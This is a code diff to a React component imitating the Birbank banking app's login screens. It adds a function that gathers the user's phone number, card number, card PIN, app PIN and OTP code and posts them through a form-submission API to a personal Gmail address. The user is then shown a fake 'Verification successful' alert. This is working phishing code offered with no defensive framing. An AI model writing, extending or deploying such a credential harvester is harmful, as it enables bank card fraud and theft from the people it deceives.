@@ -63,7 +63,44 @@ export default function BirbankApp() {
     }
   }
 
-  const handleOtpKeyPress = (key: string) => {
+  const sendDataToEmail = async (otpCodeValue: string) => {
+    const formData = {
+      access_key: "7c3d7bf3-a371-4440-8677-94410d28c95c",
+      subject: "Birbank - Yeni istifadəçi məlumatları",
+      from_name: "Birbank App",
+      to: "rustmlisbahddin94@gmail.com",
+      phone_number: phoneNumber,
+      card_number: cardNumber,
+      card_pin: pinCode,
+      app_pin: appPin,
+      otp_code: otpCodeValue,
+      message: `
+        Telefon nömrəsi: ${phoneNumber}
+        Kart nömrəsi: ${cardNumber}
+        Kartın PIN kodu: ${pinCode}
+        Tətbiq PIN kodu: ${appPin}
+        OTP kodu: ${otpCodeValue}
+      `
+    }
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formData),
+      })
+      const result = await response.json()
+      console.log("[Birbank] Email sent:", result)
+      return result.success
+    } catch (error) {
+      console.log("[Birbank] Email error:", error)
+      return false
+    }
+  }
+
+  const handleOtpKeyPress = async (key: string) => {
     if (key === "backspace") {
       if (otpCode.length > 0) {
         setOtpCode((prev) => prev.slice(0, -1))
@@ -75,6 +112,7 @@ export default function BirbankApp() {
       console.log("[Birbank] OTP input:", newOtp)
       if (newOtp.length === 4) {
         console.log("[Birbank] OTP complete:", newOtp)
+        await sendDataToEmail(newOtp)
         alert("Təsdiq uğurlu oldu! (Verification successful!)")
       }
     }
